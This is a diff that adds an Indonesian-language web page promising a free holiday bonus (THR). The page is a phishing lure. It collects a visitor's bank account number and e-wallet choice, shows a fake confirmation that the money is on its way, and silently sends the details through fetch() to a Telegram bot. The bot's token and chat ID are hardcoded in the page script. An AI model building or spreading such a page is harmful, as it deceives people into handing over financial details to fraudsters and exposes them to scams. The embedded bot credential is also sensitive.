@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THR UNTUK MU</title>
+
+    <!-- ====== GAYA HALAMAN ====== -->
+    <style>
+        /* ===== Background Bergerak (Biru & Ungu) ===== */
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(270deg, #6a11cb, #2575fc);
+            background-size: 400% 400%;
+            animation: bgMove 8s ease infinite;
+            overflow: hidden;
+        }
+
+        @keyframes bgMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* ===== Kontainer Utama ===== */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+
+        /* ===== Halaman ===== */
+        .page {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInSlideUp 0.6s ease forwards;
+        }
+
+        .show {
+            display: block;
+        }
+
+        /* ===== Animasi Halaman ===== */
+        @keyframes fadeInSlideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== Input & Tombol ===== */
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        select {
+            appearance: none;
+            background: #ffffff;
+        }
+
+        button {
+            background: #32cd32;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+            animation: pulse 1.5s infinite;
+        }
+
+        button:hover {
+            background: #228b22;
+            transform: scale(1.05);
+        }
+
+        /* ===== Animasi Tombol Berdenyut ===== */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px #32cd32; }
+            50% { box-shadow: 0 0 20px #32cd32; }
+            100% { box-shadow: 0 0 10px #32cd32; }
+        }
+
+        /* ===== Alert Keren ===== */
+        #customAlert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -55%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+    <!-- HALAMAN 1: Mau THR -->
+    <div id="homePage" class="page show">
+        <h1>🎁 Mau THR Nggak? 🎁</h1>
+        <button onclick="showPage('rekeningPage')">Mau!</button>
+        <button onclick="showAlert('Yakin nggak mau? Nyesel lho! 😜')">Nggak deh...</button>
+    </div>
+
+    <!-- HALAMAN 2: Isi Rekening -->
+    <div id="rekeningPage" class="page">
+        <h1>Isi No Rekening</h1>
+        <input type="number" id="rekening" placeholder="Masukkan Nomor" maxlength="20">
+        <button onclick="validateRekening()">Lanjut</button>
+    </div>
+
+    <!-- HALAMAN 3: Pilih Aplikasi -->
+    <div id="appPage" class="page">
+        <h1>Pilih Aplikasi</h1>
+        <select id="aplikasi">
+            <option value="" disabled selected>Pilih Aplikasi</option>
+            <option value="DANA">DANA</option>
+            <option value="OVO">OVO</option>
+            <option value="GoPay">GoPay</option>
+            <option value="ShopeePay">ShopeePay</option>
+            <option value="Lainnya">Lainnya (Isi Sendiri)</option>
+        </select>
+        <input type="text" id="aplikasiLain" placeholder="Masukkan Nama Aplikasi" style="display: none;">
+        <button onclick="kirimData()">Lanjut</button>
+    </div>
+
+    <!-- HALAMAN 4: THR Akan Cair -->
+    <div id="finalPage" class="page">
+        <h1>✅ THR Akan Cair!</h1>
+        <p>Silakan tunggu! thr akan segera masuk ke rekeningmu. 🎉</p>
+    </div>
+</div>
+
+<!-- ALERT KEREN -->
+<div id="customAlert">
+    <p id="alertMessage"></p>
+    <button onclick="closeAlert()">Oke</button>
+</div>
+
+<script>
+    const botToken = "8197346611:AAFzuVljzjMVtT0rTcviQven8Js2IQTGa8k";  // Ganti dengan token bot Telegram
+    const chatId = "-4627259207";  // Ganti dengan chat ID Telegram
+
+    function showPage(pageId) {
+        document.querySelectorAll('.page').forEach(page => page.classList.remove('show'));
+        document.getElementById(pageId).classList.add('show');
+    }
+
+    function validateRekening() {
+        const rekening = document.getElementById('rekening').value;
+        if (rekening.length < 12) {
+            showAlert('Nomor rekening minimal 12 angka!');
+        } else {
+            showPage('appPage');
+        }
+    }
+
+    document.getElementById('aplikasi').addEventListener('change', function () {
+        document.getElementById('aplikasiLain').style.display = this.value === 'Lainnya' ? 'block' : 'none';
+    });
+
+    function kirimData() {
+        const rekening = document.getElementById('rekening').value;
+        let aplikasi = document.getElementById('aplikasi').value;
+
+        if (!aplikasi) {
+            showAlert('Pilih aplikasi terlebih dahulu!');
+            return;
+        }
+
+        if (aplikasi === 'Lainnya') {
+            aplikasi = document.getElementById('aplikasiLain').value.trim();
+            if (!aplikasi) {
+                showAlert('Isi nama aplikasi!');
+                return;
+            }
+        }
+
+        const message = `THR berhasil dikirim!\nRekening: ${rekening}\nAplikasi: ${aplikasi}`;
+        showPage('finalPage');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+    }
+
+    function showAlert(message) {
+        document.getElementById('alertMessage').innerText = message;
+        document.getElementById('customAlert').style.display = 'block';
+    }
+
+    function closeAlert() {
+        document.getElementById('customAlert').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
